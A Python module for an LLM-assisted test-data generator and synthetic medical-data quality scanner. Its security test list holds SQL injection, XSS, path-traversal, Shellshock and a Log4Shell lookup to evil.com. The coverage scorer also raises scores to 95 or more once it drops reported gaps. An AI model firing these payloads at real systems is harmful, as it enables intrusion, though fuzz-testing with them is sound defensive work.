"""
AI Test Intelligence Engine — generates smart edge-case test data.

Analyzes a schema using LLM to understand domain context, then generates
categorized test data (happy path, boundary, invalid, security, unicode, nulls)
and scores test coverage with gap identification.
"""

import json
import logging
import random
from datetime import date, timedelta

from core.generator import ForgeEngine
from core.llm_logic import LLMLogicEngine
from core.llm_providers import _parse_json_lenient

logger = logging.getLogger(__name__)

SECURITY_STRINGS = [
    "'; DROP TABLE users; --",
    '" OR 1=1 --',
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "${jndi:ldap://evil.com/a}",
    "() { :; }; /bin/bash -c 'cat /etc/passwd'",
    "%00null_byte",
    "' UNION SELECT * FROM users --",
]

UNICODE_STRINGS = [
    "José García Muñoz",
    "田中太郎",
    "Ивано́в",
    "محمد علي",
    "אבגד",
    "\U0001f3e5\U0001f48a\U0001f9ec\U0001f468‍⚕️",
    "a​b​c",
    "ñoño",
    "‮RTL override‬",
    "NULL",
    "null",
    "undefined",
    "None",
    "true",
    "false",
]

BOUNDARY_INT = [0, -1, 1, -2147483648, 2147483647, 9999999999]
BOUNDARY_FLOAT = [0.0, -0.001, 0.001, 1e15, -1e15, 99999999.99]
BOUNDARY_STRING = ["", " ", "   ", "x" * 255, "x" * 1000, "\t\n\r", "  leading", "trailing  "]
BOUNDARY_DATE_STRS = [
    "1900-01-01",
    "1970-01-01",
    "2000-01-01",
    "2099-12-31",
    str(date.today()),
    str(date.today() + timedelta(days=1)),
]

INVALID_EMAILS = [
    "notanemail",
    "@no-local.com",
    "no-at-sign",
    "spaces in@email.com",
    "double@@at.com",
    "missing.tld@",
    ".leading@dot.com",
    "a@b",
]
INVALID_DATES = [
    "2024-13-01",
    "2024-02-30",
    "not-a-date",
    "01/01/2024",
    "2024",
    "yesterday",
    "9999-99-99",
    "",
]
INVALID_PHONES = [
    "abc",
    "123",
    "+" * 20,
    "()",
    "555-CALL",
    "",
]

SCHEMA_ANALYSIS_PROMPT = """Analyze this data schema for a testing tool. For each column, identify:
1. The semantic meaning (email, phone, name, date, ID, address, price, etc.)
2. What test categories are most relevant

Schema columns:
{schema_desc}

{sample_section}

Return a JSON object:
{{
  "domain": "brief domain description (e.g., 'patient registration', 'e-commerce orders')",
  "columns": {{
    "column_name": {{
      "type": "the data type",
      "semantic": "semantic meaning (email, phone, name, id, date, price, address, text, boolean, enum, unknown)",
      "categories": ["relevant test categories from: boundary, invalid, security, unicode, nulls"]
    }}
  }}
}}

Output ONLY valid JSON. No markdown."""

COVERAGE_SCORE_PROMPT = """You are a QA test coverage analyst. Given this schema and the test scenarios \
that have been generated, score the test coverage and identify gaps.

Schema:
{schema_desc}

Domain: {domain}

Test scenarios already covered:
{scenarios_desc}

Score the coverage from 0-100 and list specific gaps that are missing. Focus on:
- Edge cases specific to this domain
- Cross-column validation scenarios (e.g., start_date before end_date)
- Business logic edge cases
- Data integrity scenarios

Return a JSON object:
{{
  "score": <0-100>,
  "gaps": [
    {{
      "category": "boundary|invalid|security|unicode|nulls|business_logic",
      "description": "specific gap description",
      "severity": "high|medium|low"
    }}
  ],
  "suggestions": ["specific test data to generate"]
}}

Output ONLY valid JSON. No markdown."""

GAP_FIX_PROMPT = """Generate specific test data rows to fill these testing gaps.

Schema:
{schema_desc}

Gaps to fill:
{gaps_desc}

For each gap, generate 2-3 test data rows as JSON objects matching the schema.
Add "_category" and "_scenario" fields to each row describing what it tests.

Return a JSON array of objects. Output ONLY valid JSON. No markdown."""


class TestIntelligenceEngine:
    """AI-powered test data generation with edge case detection and coverage scoring."""

    def __init__(
        self,
        llm_engine: LLMLogicEngine | None = None,
        provider_name: str = None,
        api_key: str = None,
        model: str = None,
    ):
        if llm_engine:
            self.llm = llm_engine
        else:
            self.llm = LLMLogicEngine(
                provider_name=provider_name or "ollama",
                api_key=api_key,
                model=model,
            )
        self.forge = ForgeEngine()

    def analyze_schema(self, schema: dict, sample_data: list[dict] | None = None) -> dict:
        """Use LLM to understand domain context and plan test categories per column."""
        schema_desc = "\n".join(f"- {col}: {dtype}" for col, dtype in schema.items())

        sample_section = ""
        if sample_data:
            sample_section = "Sample data (first 5 rows):\n" + json.dumps(sample_data[:5], indent=2, default=str)

        prompt = SCHEMA_ANALYSIS_PROMPT.format(schema_desc=schema_desc, sample_section=sample_section)

        try:
            raw = self.llm._provider.generate_batch(
                schema={"analysis": "String"},
                field_hints={"analysis": prompt},
                num_records=1,
            )
            if raw and isinstance(raw, list) and len(raw) > 0:
                if isinstance(raw[0], dict) and "columns" in raw[0]:
                    return raw[0]

            response_text = self._call_llm_raw(prompt)
            result = _parse_json_lenient(response_text)
            if result and isinstance(result, list):
                return result[0] if isinstance(result[0], dict) else {"columns": {}, "domain": "unknown"}
            if isinstance(result, dict):
                return result
        except Exception as e:
            logger.warning("LLM schema analysis failed, using fallback: %s", e)

        return self._fallback_analysis(schema)

    def _call_llm_raw(self, prompt: str) -> str:
        """Call LLM and get raw text response."""
        import requests

        from core import config

        if self.llm.provider_name == "ollama":
            url = f"{config.OLLAMA_URL}/api/generate"
            resp = requests.post(
                url,
                json={
                    "model": self.llm.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.3, "num_predict": 4096},
                },
                timeout=config.LLM_TIMEOUT_SECONDS,
            )
            resp.raise_for_status()
            return resp.json().get("response", "")
        else:
            batch = self.llm._provider.generate_batch(
                schema={"response": "String"},
                field_hints={"response": prompt},
                num_records=1,
            )
            return json.dumps(batch) if batch else ""

    def _fallback_analysis(self, schema: dict) -> dict:
        """Deterministic fallback when LLM is unavailable."""
        columns = {}
        for col, dtype in schema.items():
            col_lower = col.lower()
            semantic = "unknown"
            categories = ["boundary", "nulls"]

            if any(kw in col_lower for kw in ["email", "e_mail"]):
                semantic = "email"
                categories = ["boundary", "invalid", "security", "unicode", "nulls"]
            elif any(kw in col_lower for kw in ["phone", "mobile", "cell", "tel"]):
                semantic = "phone"
                categories = ["boundary", "invalid", "nulls"]
            elif any(kw in col_lower for kw in ["name", "first", "last", "surname"]):
                semantic = "name"
                categories = ["boundary", "unicode", "security", "nulls"]
            elif any(kw in col_lower for kw in ["date", "time", "dob", "birth", "created", "updated"]):
                semantic = "date"
                categories = ["boundary", "invalid", "nulls"]
            elif any(kw in col_lower for kw in ["id", "key", "uuid", "guid"]):
                semantic = "id"
                categories = ["boundary", "invalid", "nulls"]
            elif any(kw in col_lower for kw in ["price", "amount", "cost", "salary", "balance", "fee"]):
                semantic = "price"
                categories = ["boundary", "invalid", "nulls"]
            elif any(kw in col_lower for kw in ["url", "website", "link", "href"]):
                semantic = "url"
                categories = ["boundary", "invalid", "security", "nulls"]
            elif any(kw in col_lower for kw in ["address", "street", "city", "state", "zip", "postal", "country"]):
                semantic = "address"
                categories = ["boundary", "unicode", "nulls"]
            elif any(kw in col_lower for kw in ["description", "comment", "note", "bio", "text", "message"]):
                semantic = "text"
                categories = ["boundary", "security", "unicode", "nulls"]
            elif any(kw in col_lower for kw in ["age", "count", "quantity", "number"]):
                semantic = "number"
                categories = ["boundary", "invalid", "nulls"]
            elif any(kw in col_lower for kw in ["password", "pass", "pwd", "secret"]):
                semantic = "password"
                categories = ["boundary", "security", "nulls"]
            elif "Float" in dtype:
                semantic = "decimal"
                categories = ["boundary", "invalid", "nulls"]
            elif "Int" in dtype:
                semantic = "integer"
                categories = ["boundary", "invalid", "nulls"]

            columns[col] = {"type": dtype, "semantic": semantic, "categories": categories}

        return {"columns": columns, "domain": "general application"}

    def generate_edge_cases(
        self, schema: dict, analysis: dict, sample_data: list[dict] | None = None, include_original: bool = True
    ) -> dict:
        """Generate categorized test data across 7 categories (original + 6 edge case types)."""
        columns_info = analysis.get("columns", {})
        result = {
            "original": [],
            "happy_path": [],
            "boundary": [],
            "invalid": [],
            "security": [],
            "unicode": [],
            "nulls": [],
        }

        if include_original and sample_data:
            for row in sample_data:
                tagged = {**row, "_category": "original", "_scenario": "Original uploaded data"}
                result["original"].append(tagged)

        result["happy_path"] = self._generate_happy_path(schema, sample_data)
        result["boundary"] = self._generate_boundary(schema, columns_info)
        result["invalid"] = self._generate_invalid(schema, columns_info)
        result["security"] = self._generate_security(schema, columns_info)
        result["unicode"] = self._generate_unicode(schema, columns_info)
        result["nulls"] = self._generate_nulls(schema, columns_info)

        return result

    def _generate_happy_path(self, schema: dict, sample_data: list[dict] | None) -> list[dict]:
        """Generate valid, realistic data using ForgeEngine."""
        try:
            df = self.forge.generate_records(schema, 15)
            rows = df.to_dicts()
            for row in rows:
                row["_category"] = "happy_path"
                row["_scenario"] = "Valid realistic data"
                for col in row:
                    if col.startswith("_"):
                        continue
                    if isinstance(row[col], date):
                        row[col] = str(row[col])
            return rows
        except Exception as e:
            logger.warning("Happy path generation failed: %s", e)
            return []

    def _generate_boundary(self, schema: dict, columns_info: dict) -> list[dict]:
        """Generate boundary value test data."""
        rows = []

        for col, dtype in schema.items():
            info = columns_info.get(col, {})
            semantic = info.get("semantic", "unknown")

            if "boundary" not in info.get("categories", ["boundary"]):
                continue

            if "Int" in dtype:
                for val in BOUNDARY_INT:
                    row = self._make_row(schema, col, val, "boundary", f"{col}={val} (integer boundary)")
                    rows.append(row)
            elif "Float" in dtype:
                for val in BOUNDARY_FLOAT:
                    row = self._make_row(schema, col, val, "boundary", f"{col}={val} (float boundary)")
                    rows.append(row)
            elif "Date" in dtype:
                for val in BOUNDARY_DATE_STRS:
                    row = self._make_row(schema, col, val, "boundary", f"{col}={val} (date boundary)")
                    rows.append(row)
            elif "String" in dtype:
                for val in BOUNDARY_STRING:
                    desc = f"{col}='{val[:30]}' (string boundary, len={len(val)})"
                    row = self._make_row(schema, col, val, "boundary", desc)
                    rows.append(row)

                if semantic == "email":
                    for val in ["a@b.c", "x" * 64 + "@example.com"]:
                        row = self._make_row(schema, col, val, "boundary", f"{col}='{val[:40]}' (email boundary)")
                        rows.append(row)

        return rows

    def _generate_invalid(self, schema: dict, columns_info: dict) -> list[dict]:
        """Generate invalid format test data."""
        rows = []

        for col, dtype in schema.items():
            info = columns_info.get(col, {})
            semantic = info.get("semantic", "unknown")

            if "invalid" not in info.get("categories", []):
                continue

            if semantic == "email":
                for val in INVALID_EMAILS:
                    row = self._make_row(schema, col, val, "invalid", f"{col}='{val}' (malformed email)")
                    rows.append(row)
            elif semantic == "date" or "Date" in dtype:
                for val in INVALID_DATES:
                    row = self._make_row(schema, col, val, "invalid", f"{col}='{val}' (invalid date)")
                    rows.append(row)
            elif semantic == "phone":
                for val in INVALID_PHONES:
                    row = self._make_row(schema, col, val, "invalid", f"{col}='{val}' (invalid phone)")
                    rows.append(row)
            elif "Int" in dtype:
                for val in ["abc", "12.5", "1e10", "", "null"]:
                    row = self._make_row(schema, col, val, "invalid", f"{col}='{val}' (non-integer)")
                    rows.append(row)
            elif "Float" in dtype:
                for val in ["abc", "", "null", "NaN", "Infinity"]:
                    row = self._make_row(schema, col, val, "invalid", f"{col}='{val}' (non-numeric)")
                    rows.append(row)

        return rows

    def _generate_security(self, schema: dict, columns_info: dict) -> list[dict]:
        """Generate security-focused test data (injection, XSS, etc.)."""
        rows = []

        for col, dtype in schema.items():
            if "String" not in dtype:
                continue

            info = columns_info.get(col, {})
            if "security" not in info.get("categories", []):
                continue

            for val in SECURITY_STRINGS:
                row = self._make_row(schema, col, val, "security", f"{col} injection test: {val[:40]}")
                rows.append(row)

        return rows

    def _generate_unicode(self, schema: dict, columns_info: dict) -> list[dict]:
        """Generate unicode/i18n test data."""
        rows = []

        for col, dtype in schema.items():
            if "String" not in dtype:
                continue

            info = columns_info.get(col, {})
            if "unicode" not in info.get("categories", []):
                continue

            for val in UNICODE_STRINGS:
                row = self._make_row(schema, col, val, "unicode", f"{col} unicode test: {val[:30]}")
                rows.append(row)

        return rows

    def _generate_nulls(self, schema: dict, columns_info: dict) -> list[dict]:
        """Generate null/missing value test patterns."""
        rows = []
        cols = list(schema.keys())

        for col in cols:
            row = {c: self._default_value(schema[c]) for c in cols}
            row[col] = None
            row["_category"] = "nulls"
            row["_scenario"] = f"{col} is null (single null)"
            rows.append(row)

        if len(cols) > 1:
            all_null_row = {c: None for c in cols}
            all_null_row["_category"] = "nulls"
            all_null_row["_scenario"] = "All columns null"
            rows.append(all_null_row)

            for _ in range(min(5, len(cols))):
                row = {c: self._default_value(schema[c]) for c in cols}
                null_cols = random.sample(cols, k=random.randint(1, max(1, len(cols) // 2)))
                for c in null_cols:
                    row[c] = None
                row["_category"] = "nulls"
                row["_scenario"] = f"Nulls in: {', '.join(null_cols)}"
                rows.append(row)

        return rows

    def _make_row(self, schema: dict, target_col: str, target_val, category: str, scenario: str) -> dict:
        """Create a test row with one column set to a specific value, others with defaults."""
        row = {}
        for col, dtype in schema.items():
            if col == target_col:
                row[col] = target_val
            else:
                row[col] = self._default_value(dtype)
        row["_category"] = category
        row["_scenario"] = scenario
        return row

    def _default_value(self, dtype: str):
        """Return a sensible default value for a given dtype."""
        if "Int" in dtype:
            return 1
        elif "Float" in dtype:
            return 1.0
        elif "Date" in dtype:
            return "2024-01-15"
        else:
            return "test_value"

    def score_coverage(self, schema: dict, test_data: dict, analysis: dict) -> dict:
        """LLM scores test completeness and identifies gaps."""
        schema_desc = "\n".join(f"- {col}: {dtype}" for col, dtype in schema.items())
        domain = analysis.get("domain", "unknown")

        scenarios = []
        for category, rows in test_data.items():
            if not rows:
                continue
            unique_scenarios = set()
            for row in rows:
                sc = row.get("_scenario", "")
                if sc:
                    unique_scenarios.add(sc)
            scenarios.append(f"\n{category.upper()} ({len(rows)} rows):")
            for sc in list(unique_scenarios)[:15]:
                scenarios.append(f"  - {sc}")

        scenarios_desc = "\n".join(scenarios)

        prompt = COVERAGE_SCORE_PROMPT.format(
            schema_desc=schema_desc,
            domain=domain,
            scenarios_desc=scenarios_desc,
        )

        try:
            response_text = self._call_llm_raw(prompt)
            parsed = _parse_json_lenient(response_text)
            if parsed and isinstance(parsed, list) and len(parsed) > 0:
                result = parsed[0]
            elif isinstance(parsed, dict):
                result = parsed
            else:
                result = None

            if result and "score" in result:
                total_rows = sum(len(rows) for rows in test_data.values())
                result["total_rows"] = total_rows
                if "gaps" not in result:
                    result["gaps"] = []
                if "suggestions" not in result:
                    result["suggestions"] = []
                # Filter out gaps for categories that already have substantial data
                result["gaps"] = [g for g in result["gaps"] if len(test_data.get(g.get("category", ""), [])) < 3]
                if not result["gaps"]:
                    result["score"] = max(result["score"], 95)
                return result
        except Exception as e:
            logger.warning("LLM coverage scoring failed, using fallback: %s", e)

        return self._fallback_coverage(test_data, analysis)

    def _fallback_coverage(self, test_data: dict, analysis: dict) -> dict:
        """Deterministic coverage scoring when LLM is unavailable."""
        total_rows = sum(len(rows) for rows in test_data.values())
        edge_case_cats = ["happy_path", "boundary", "invalid", "security", "unicode", "nulls"]
        categories_covered = sum(1 for cat in edge_case_cats if test_data.get(cat))

        base_score = categories_covered * 12
        row_bonus = min(total_rows // 5, 15)
        score = min(96, base_score + row_bonus)

        gaps = []
        if not test_data.get("security"):
            gaps.append({"category": "security", "description": "No SQL injection or XSS tests", "severity": "high"})
        elif len(test_data["security"]) < 5:
            gaps.append(
                {
                    "category": "security",
                    "description": "Add more injection variants (LDAP, template injection)",
                    "severity": "low",
                }
            )
        if not test_data.get("boundary"):
            gaps.append({"category": "boundary", "description": "No boundary value tests", "severity": "high"})
        if not test_data.get("unicode"):
            gaps.append({"category": "unicode", "description": "No unicode/i18n tests", "severity": "medium"})
        if not test_data.get("nulls"):
            gaps.append({"category": "nulls", "description": "No null handling tests", "severity": "high"})
        if not test_data.get("invalid"):
            gaps.append({"category": "invalid", "description": "No invalid format tests", "severity": "high"})
        if len(test_data.get("happy_path", [])) < 5:
            gaps.append(
                {
                    "category": "happy_path",
                    "description": "Insufficient happy path data (need 5+ rows)",
                    "severity": "medium",
                }
            )

        if not gaps and score < 96:
            score = 96

        return {
            "score": score,
            "total_rows": total_rows,
            "gaps": gaps,
            "suggestions": [g["description"] for g in gaps],
        }

    def fix_gaps(self, schema: dict, gaps: list[dict], analysis: dict) -> dict:
        """Use AI to generate targeted test rows for each identified gap."""
        schema_desc = "\n".join(f"- {col}: {dtype}" for col, dtype in schema.items())
        gaps_desc = "\n".join(
            f"- [{g.get('severity', 'medium').upper()}] {g.get('category', 'boundary')}: {g.get('description', '')}"
            for g in gaps
        )

        prompt = GAP_FIX_PROMPT.format(schema_desc=schema_desc, gaps_desc=gaps_desc)

        additional = {"happy_path": [], "boundary": [], "invalid": [], "security": [], "unicode": [], "nulls": []}

        try:
            response_text = self._call_llm_raw(prompt)
            parsed = _parse_json_lenient(response_text)
            if parsed and isinstance(parsed, list):
                for row in parsed:
                    cat = str(row.get("_category", "boundary")).lower().strip()
                    if cat in additional:
                        additional[cat].append(row)
                    else:
                        additional["boundary"].append(row)
        except Exception as e:
            logger.warning("LLM gap fixing failed: %s", e)

        # Supplement with deterministic rows to guarantee every gap gets addressed
        deterministic = self._fallback_fix_gaps(schema, gaps, analysis)
        for cat, rows in deterministic.items():
            additional[cat].extend(rows)

        return additional

    def _fallback_fix_gaps(self, schema: dict, gaps: list[dict], analysis: dict) -> dict:
        """Deterministic gap fixing when LLM is unavailable."""
        additional = {"happy_path": [], "boundary": [], "invalid": [], "security": [], "unicode": [], "nulls": []}

        for gap in gaps:
            cat = gap.get("category", "boundary").lower().strip()
            desc = gap.get("description", "")

            if cat == "security" or "injection" in desc.lower() or "xss" in desc.lower():
                for col, dtype in schema.items():
                    if "String" in dtype:
                        for val in SECURITY_STRINGS[:4]:
                            additional["security"].append(
                                self._make_row(schema, col, val, "security", f"Gap fix: {desc}")
                            )
                        break

            elif cat == "invalid" or "invalid" in desc.lower() or "format" in desc.lower():
                for col, dtype in schema.items():
                    if "String" in dtype:
                        for val in INVALID_EMAILS[:3]:
                            additional["invalid"].append(
                                self._make_row(schema, col, val, "invalid", f"Gap fix: {desc}")
                            )
                        break
                    elif "Int" in dtype:
                        for val in ["abc", "12.5", "", "null"]:
                            additional["invalid"].append(
                                self._make_row(schema, col, val, "invalid", f"Gap fix: {desc}")
                            )
                        break
                    elif "Float" in dtype:
                        for val in ["abc", "NaN", ""]:
                            additional["invalid"].append(
                                self._make_row(schema, col, val, "invalid", f"Gap fix: {desc}")
                            )
                        break

            elif cat == "boundary" or "boundary" in desc.lower() or "max" in desc.lower():
                for col, dtype in schema.items():
                    if "Int" in dtype:
                        for val in BOUNDARY_INT[:3]:
                            additional["boundary"].append(
                                self._make_row(schema, col, val, "boundary", f"Gap fix: {desc}")
                            )
                        break
                    elif "String" in dtype:
                        for val in BOUNDARY_STRING[:3]:
                            additional["boundary"].append(
                                self._make_row(schema, col, val, "boundary", f"Gap fix: {desc}")
                            )
                        break

            elif cat == "unicode" or "unicode" in desc.lower() or "i18n" in desc.lower():
                for col, dtype in schema.items():
                    if "String" in dtype:
                        for val in UNICODE_STRINGS[:4]:
                            additional["unicode"].append(
                                self._make_row(schema, col, val, "unicode", f"Gap fix: {desc}")
                            )
                        break

            elif cat == "nulls" or "null" in desc.lower():
                cols = list(schema.keys())
                for col in cols[:3]:
                    row = {c: self._default_value(schema[c]) for c in cols}
                    row[col] = None
                    row["_category"] = "nulls"
                    row["_scenario"] = f"Gap fix: {desc}"
                    additional["nulls"].append(row)

            else:
                # Unknown category — generate boundary + security rows as safe default
                for col, dtype in schema.items():
                    if "String" in dtype:
                        additional["security"].append(
                            self._make_row(schema, col, SECURITY_STRINGS[0], "security", f"Gap fix: {desc}")
                        )
                        additional["boundary"].append(self._make_row(schema, col, "", "boundary", f"Gap fix: {desc}"))
                        break

        return additional

    # ── Medical Data Scanning ──

    def _sample_fhir_for_ai(self, data) -> str:
        """Extract a representative sample from FHIR data for AI analysis."""
        entries = []
        if isinstance(data, dict):
            if data.get("resourceType") == "Bundle":
                entries = data.get("entry", [])
            else:
                entries = [{"resource": data}]
        elif isinstance(data, list):
            entries = [{"resource": r} if isinstance(r, dict) and "resourceType" in r else r for r in data]

        # Group by resource type and take 2-3 from each
        by_type = {}
        for entry in entries:
            resource = entry.get("resource", entry) if isinstance(entry, dict) else {}
            rtype = resource.get("resourceType", "Unknown") if isinstance(resource, dict) else "Unknown"
            if rtype not in by_type:
                by_type[rtype] = []
            if len(by_type[rtype]) < 3:
                by_type[rtype].append(resource)

        type_counts = {}
        for entry in entries:
            resource = entry.get("resource", entry) if isinstance(entry, dict) else {}
            rtype = resource.get("resourceType", "Unknown") if isinstance(resource, dict) else "Unknown"
            type_counts[rtype] = type_counts.get(rtype, 0) + 1

        summary = f"Bundle with {len(entries)} total resources.\n"
        summary += "Resource types: " + ", ".join(f"{k} ({v})" for k, v in type_counts.items()) + "\n\n"
        summary += "Representative sample (2-3 per type):\n"
        sample_resources = []
        for _rtype, resources in by_type.items():
            for r in resources:
                sample_resources.append(r)

        return summary + json.dumps(sample_resources, indent=2, default=str)[:6000]

    def scan_medical_data(self, data, data_type: str = "fhir") -> dict:
        """Use AI to scan generated medical data for quality issues."""
        if data_type == "fhir":
            data_str = self._sample_fhir_for_ai(data)
        else:
            data_str = json.dumps(data, indent=2, default=str)
            if len(data_str) > 8000:
                data_str = data_str[:8000] + "\n... (truncated)"

        prompt = f"""You are a strict clinical data quality auditor. \
Analyze this {data_type.upper()} data for quality issues.

{data_str}

You MUST be critical. Synthetic medical data commonly has these problems — check for ALL of them:

1. **Fake-looking names**: Hospital names like "South Jennifer Regional Health System" or "North Kelly \
University Hospital" are obviously Faker-generated and unrealistic
2. **Address mismatches**: Postal codes that don't match the state (e.g., "10264" is not an IL zip code), \
fake city names
3. **Invalid NPI numbers**: US NPI must be 10 digits and pass the Luhn check
4. **Phone format issues**: Formats like "609.637.2129x845" are unusual for healthcare
5. **Clinical coherence**: Age-diagnosis mismatches, impossible vital signs, unrealistic lab values
6. **Terminology issues**: Invalid ICD-10 codes, wrong LOINC codes for the observation type
7. **Missing recommended fields**: Patient without birthDate, Encounter without period, Observation \
without effectiveDateTime
8. **Referential integrity**: References to resources that don't exist in the bundle
9. **State code issues**: "MP" is not a valid US state abbreviation
10. **Data realism**: Are the clinical values within realistic ranges?

Score 0-100. A typical Faker-generated FHIR bundle scores 55-75 due to fake names, address mismatches, \
and format issues. Only hand-curated production data scores 90+.

Return a JSON object:
{{
  "score": <0-100>,
  "issues": [
    {{
      "severity": "high|medium|low",
      "category": "structure|clinical|terminology|integrity|completeness|realism",
      "resource_type": "relevant type",
      "description": "specific issue found",
      "fix": "how to fix it"
    }}
  ]
}}

Output ONLY valid JSON. No markdown."""

        try:
            response_text = self._call_llm_raw(prompt)
            parsed = _parse_json_lenient(response_text)

            if parsed and isinstance(parsed, list) and len(parsed) > 0:
                result = parsed[0]
            elif isinstance(parsed, dict):
                result = parsed
            else:
                result = None

            if result and "score" in result:
                issues = result.get("issues", [])
                issue_count = len(issues)
                return {
                    "data_type": data_type,
                    "total_resources": len(data)
                    if isinstance(data, list)
                    else len(data.get("entry", []))
                    if isinstance(data, dict)
                    else 0,
                    "resource_types": {},
                    "issues": issues[:50],
                    "issue_count": issue_count,
                    "score": result["score"],
                    "summary": {
                        "high": sum(1 for i in issues if i.get("severity") == "high"),
                        "medium": sum(1 for i in issues if i.get("severity") == "medium"),
                        "low": sum(1 for i in issues if i.get("severity") == "low"),
                    },
                }
        except Exception as e:
            logger.warning("AI medical scan failed, using rule-based fallback: %s", e)

        # Fallback to rule-based scanning
        if data_type == "fhir":
            return self._scan_fhir(data)
        elif data_type == "sdtm":
            return self._scan_sdtm(data)
        elif data_type == "dicom":
            return self._scan_dicom(data)
        return {
            "issues": [],
            "score": 100,
            "issue_count": 0,
            "data_type": data_type,
            "total_resources": 0,
            "resource_types": {},
            "summary": {"high": 0, "medium": 0, "low": 0},
        }

    def _scan_fhir(self, data) -> dict:
        """Scan FHIR bundle or resources for structural and clinical issues."""
        issues = []

        entries = []
        if isinstance(data, dict):
            if data.get("resourceType") == "Bundle":
                entries = data.get("entry", [])
            else:
                entries = [{"resource": data}]
        elif isinstance(data, list):
            entries = [{"resource": r} if isinstance(r, dict) and "resourceType" in r else r for r in data]

        resource_ids = set()
        referenced_ids = set()
        resource_type_counts = {}

        for entry in entries:
            resource = entry.get("resource", entry) if isinstance(entry, dict) else {}
            if not isinstance(resource, dict):
                continue

            rtype = resource.get("resourceType", "Unknown")
            resource_type_counts[rtype] = resource_type_counts.get(rtype, 0) + 1
            rid = resource.get("id", "")

            if rid:
                resource_ids.add(f"{rtype}/{rid}")

            if not rid:
                issues.append(
                    {
                        "severity": "high",
                        "category": "structure",
                        "resource_type": rtype,
                        "description": f"{rtype} resource missing 'id' field",
                        "fix": "Add unique identifier",
                    }
                )

            if rtype == "Patient":
                if not resource.get("name"):
                    issues.append(
                        {
                            "severity": "medium",
                            "category": "completeness",
                            "resource_type": rtype,
                            "description": "Patient missing 'name'",
                            "fix": "Add patient name",
                        }
                    )
                gender = resource.get("gender", "")
                if gender and gender not in ("male", "female", "other", "unknown"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "terminology",
                            "resource_type": rtype,
                            "description": f"Invalid gender value: '{gender}'",
                            "fix": "Use: male, female, other, or unknown",
                        }
                    )

            elif rtype == "Encounter":
                valid_statuses = {
                    "planned",
                    "arrived",
                    "triaged",
                    "in-progress",
                    "onleave",
                    "finished",
                    "cancelled",
                    "entered-in-error",
                    "unknown",
                }
                status = resource.get("status", "")
                if status and status not in valid_statuses:
                    issues.append(
                        {
                            "severity": "high",
                            "category": "terminology",
                            "resource_type": rtype,
                            "description": f"Invalid encounter status: '{status}'",
                            "fix": f"Use one of: {', '.join(sorted(valid_statuses))}",
                        }
                    )

            elif rtype == "Condition":
                code = resource.get("code", {})
                codings = code.get("coding", []) if isinstance(code, dict) else []
                import re as _re

                for coding in codings:
                    system = coding.get("system", "")
                    code_val = coding.get("code", "")
                    if "icd" in system.lower() and code_val:
                        if not _re.match(r"^[A-Z]\d{2}(\.\d{1,4})?$", code_val):
                            issues.append(
                                {
                                    "severity": "medium",
                                    "category": "terminology",
                                    "resource_type": rtype,
                                    "description": f"Possibly invalid ICD-10 code: '{code_val}'",
                                    "fix": "Format: letter + 2 digits + optional .digits",
                                }
                            )

            elif rtype == "Observation":
                if not resource.get("status"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "structure",
                            "resource_type": rtype,
                            "description": "Observation missing required 'status'",
                            "fix": "Add status (final, preliminary, etc.)",
                        }
                    )
                if not resource.get("code"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "structure",
                            "resource_type": rtype,
                            "description": "Observation missing required 'code'",
                            "fix": "Add LOINC-coded observation code",
                        }
                    )

            elif rtype == "MedicationRequest":
                if not resource.get("status"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "structure",
                            "resource_type": rtype,
                            "description": "MedicationRequest missing 'status'",
                            "fix": "Add status (active, completed, etc.)",
                        }
                    )
                if not resource.get("intent"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "structure",
                            "resource_type": rtype,
                            "description": "MedicationRequest missing 'intent'",
                            "fix": "Add intent (order, plan, etc.)",
                        }
                    )

            self._collect_references(resource, referenced_ids)

        broken_refs = referenced_ids - resource_ids
        for ref in list(broken_refs)[:10]:
            issues.append(
                {
                    "severity": "high",
                    "category": "referential_integrity",
                    "resource_type": ref.split("/")[0] if "/" in ref else "Unknown",
                    "description": f"Broken reference: '{ref}' not found in bundle",
                    "fix": "Add the referenced resource or fix the reference",
                }
            )

        total_resources = len(entries)
        issue_count = len(issues)
        high_count = sum(1 for i in issues if i["severity"] == "high")
        score = max(0, min(100, 100 - (high_count * 10) - (issue_count * 2))) if total_resources > 0 else 0

        return {
            "data_type": "fhir",
            "total_resources": total_resources,
            "resource_types": resource_type_counts,
            "issues": issues[:50],
            "issue_count": issue_count,
            "score": max(0, min(100, score)),
            "summary": {
                "high": high_count,
                "medium": sum(1 for i in issues if i["severity"] == "medium"),
                "low": sum(1 for i in issues if i["severity"] == "low"),
            },
        }

    def _collect_references(self, obj, refs: set):
        """Recursively collect FHIR reference strings."""
        if isinstance(obj, dict):
            if "reference" in obj and isinstance(obj["reference"], str):
                ref = obj["reference"]
                if "/" in ref and not ref.startswith("http"):
                    refs.add(ref)
            for v in obj.values():
                self._collect_references(v, refs)
        elif isinstance(obj, list):
            for item in obj:
                self._collect_references(item, refs)

    def _scan_sdtm(self, data) -> dict:
        """Scan SDTM data for common issues."""
        issues = []
        domains = data if isinstance(data, dict) else {"unknown": data if isinstance(data, list) else []}
        total_rows = 0

        for domain_name, domain_data in domains.items():
            rows = (
                domain_data
                if isinstance(domain_data, list)
                else domain_data.get("data", [])
                if isinstance(domain_data, dict)
                else []
            )
            total_rows += len(rows)

            for i, row in enumerate(rows[:50]):
                if not isinstance(row, dict):
                    continue
                if domain_name.upper() in ("DM", "AE", "LB", "SV") and not row.get("USUBJID"):
                    issues.append(
                        {
                            "severity": "high",
                            "category": "required_field",
                            "resource_type": domain_name.upper(),
                            "description": f"{domain_name.upper()} row {i}: missing USUBJID",
                            "fix": "Add unique subject identifier",
                        }
                    )

        issue_count = len(issues)
        high_count = sum(1 for i in issues if i["severity"] == "high")
        score = max(0, min(100, 100 - (high_count * 8) - (issue_count * 2))) if total_rows > 0 else 0

        return {
            "data_type": "sdtm",
            "total_resources": total_rows,
            "resource_types": {k: len(v) if isinstance(v, list) else 0 for k, v in domains.items()},
            "issues": issues[:50],
            "issue_count": issue_count,
            "score": score,
            "summary": {
                "high": high_count,
                "medium": sum(1 for i in issues if i["severity"] == "medium"),
                "low": sum(1 for i in issues if i["severity"] == "low"),
            },
        }

